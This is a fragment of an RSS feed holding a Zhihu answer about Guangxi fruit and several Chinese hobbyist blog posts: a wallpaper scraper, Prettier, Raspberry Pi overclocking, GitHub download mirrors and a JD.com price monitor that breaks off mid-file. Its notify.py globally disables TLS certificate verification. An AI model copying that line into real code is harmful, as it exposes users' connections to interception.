data-watermark-src=\"v2-6de5ff5a5ab7cf49a47266d9d1b57ea6\" data-private-watermark-src=\"v2-f347b1b2bcc2f86b160bf547f3c3c99c\"></p>\n<p>广西的水果多到什么程度呢</p>\n<p>就是你在网上下单鲜果直邮，其中80%发货地都是广西</p>\n<p>甚至还有一部分海南芒果，四川沃柑激情下单之后发现，发货地依然是广西（此处特指物美价廉的广西水果，没有鼓励虚假发货欺骗消费者的意思，那些打着头衔以次充好的无良商家，给我举报起来）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-fb2318ddbf09210a5391f732feff0fb2_720w.jpg?rss\" data-rawwidth=\"935\" data-rawheight=\"310\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fb2318ddbf09210a5391f732feff0fb2\" data-watermark-src=\"v2-cde1d72f4e8178430686723f6cc11fee\" data-private-watermark-src=\"v2-b9296d6071c58e6d0a5480d5e1f1695a\"></p>\n<p>广西的水果产业不仅让本地小伙伴们一饱口福</p>\n<p>从经济角度来说，水果还是广西五大支柱种植产业之一，带动经济超千亿</p>\n<p><b>广西全区的水果产值和农民水果收入占比达20％，更是带动农民脱贫的重要途径之一</b></p>\n<p>同时，因为广西独到的水果种植眼光，早在上个世纪七十年代就开始尝试种植一些海外引进的新品种</p>\n<p>比如牛油果，虽然在大家眼中，这个不甜不脆吃起来像嚼融化的蜡的东西，实在不能称之为水果</p>\n<p>但随着健身热的兴起，牛油果被大众看见，成为健康餐桌上的新宠回头发现，广西和云南都已建好规模化的牛油果生产基地</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ddf1eaf34b95bfc31937b2b97201dd3b_720w.jpg?rss\" data-rawwidth=\"494\" data-rawheight=\"359\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-ddf1eaf34b95bfc31937b2b97201dd3b\" data-watermark-src=\"v2-d9e3b6f43a755c895537742efd0cb5b0\" data-private-watermark-src=\"v2-c95633c207b65c991f47c13f9abb27a7\"></p>\n<p><br></p>\n<p>水果猎人们可千万不要错过广西这个宝藏地，去体验一下真正的水果自由吧~</p>\n<p><br></p>\n<p>对了，也别忘记尝试一下酸爽的螺蛳粉哟~</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-35b306c9583f25d0ea4dee1b7374cf02_720w.jpg?rss\" data-rawwidth=\"960\" data-rawheight=\"682\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-35b306c9583f25d0ea4dee1b7374cf02\" data-watermark-src=\"v2-2c7041104a9140400eb2adbdb527f9d1\" data-private-watermark-src=\"v2-98efa64ac70174e77678071065789d14\"></p>\n<p><br></p>\n<p>-完-</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-ni-ma-94?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">王尼玛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/339131125/answer/2008546912?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">183 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/476087360?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">广西真的有那么差吗？</a><br><a href=\"http://www.zhihu.com/question/412568968?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问广西话“你这人挺嗦的”是什么意思啊？</a><br>\n","link":"http://www.zhihu.com/question/339131125/answer/2008546912?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"使用 Python 爬取故宫壁纸","date":"2021-07-17 05:55:00","description":"\n<p>我非常喜欢故宫壁纸，但是一张一张下载的速度就太慢了。</p>\n<p>于是，我就写了个简单的 Python 小程序自动爬取故宫壁纸。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%A3%E7%A0%81\" class=\"headerlink\" title=\"代码\"></a>代码</h2>\n<p>首先，我们通过简单的查看，知道故宫壁纸的页面并没有使用 JavaScript 载入。</p>\n<p>但是故宫壁纸很多，所以还需要分类。</p>\n<p>故宫壁纸大多都是以分类开头，如 <code>爱上紫禁城 紫藤</code>, <code>清   虚谷紫藤金鱼图轴（局部）</code> 等等，所以一般只需要做个简单的 <code>startswith()</code> 判断就 OK 了。</p>\n<p>很多壁纸的标题都是一样的，所以还可以使用 <code>random</code> 库在文件名末尾追加一个随机数。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests, bs4, time, random</span><br><span class=\"line\">path = <span class=\"string\">\"./wallpaper/爱上紫禁城\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">catch = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>, <span class=\"number\">119</span>):</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    url = <span class=\"string\">\"https://www.dpm.org.cn/lights/royal/p/{}.html\"</span>.<span class=\"built_in\">format</span>(i)</span><br><span class=\"line\">    <span class=\"comment\"># 发送请求</span></span><br><span class=\"line\">    response = requests.get(url)</span><br><span class=\"line\">    <span class=\"comment\"># 设定页面编码为 UTF-8</span></span><br><span class=\"line\">    response.encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">    <span class=\"comment\"># 从 HTML 中解析数据</span></span><br><span class=\"line\">    soup = bs4.BeautifulSoup(response.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">    image = soup.find_all(name=<span class=\"string\">\"div\"</span>, class_=<span class=\"string\">\"pic\"</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 循环输出图片</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> image:</span><br><span class=\"line\">        catch = catch + <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"comment\"># 获得壁纸名称</span></span><br><span class=\"line\">        <span class=\"comment\"># 分类，不是以【爱上紫禁城】开头的壁纸都忽略</span></span><br><span class=\"line\">        img_name = n.a.img[<span class=\"string\">\"title\"</span>]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> img_name.startswith(<span class=\"string\">\"明\"</span>):</span><br><span class=\"line\">            print(<span class=\"string\">\"{}. {}\"</span>.<span class=\"built_in\">format</span>(catch, n.a.img[<span class=\"string\">\"title\"</span>]))</span><br><span class=\"line\">            <span class=\"comment\"># 组合获得壁纸页面</span></span><br><span class=\"line\">            url_1080 = <span class=\"string\">\"https://www.dpm.org.cn\"</span> + n.a[<span class=\"string\">\"href\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 请求高清版网页</span></span><br><span class=\"line\">            response_img = requests.get(url_1080)</span><br><span class=\"line\">            <span class=\"comment\"># 再次解析</span></span><br><span class=\"line\">            soup_img = bs4.BeautifulSoup(response_img.text, <span class=\"string\">\"lxml\"</span>)</span><br><span class=\"line\">            <span class=\"comment\"># 获取页面中的图片</span></span><br><span class=\"line\">            data = soup_img.find_all(name=<span class=\"string\">\"img\"</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 获得壁纸图片的链接</span></span><br><span class=\"line\">            img_url = data[<span class=\"string\">\"src\"</span>]</span><br><span class=\"line\">            <span class=\"comment\"># 保存图片</span></span><br><span class=\"line\">            pic = requests.get(img_url).content</span><br><span class=\"line\">            file_name = path + img_name + <span class=\"string\">\"-\"</span> + <span class=\"built_in\">str</span>(random.randint(<span class=\"number\">100000</span>, <span class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span 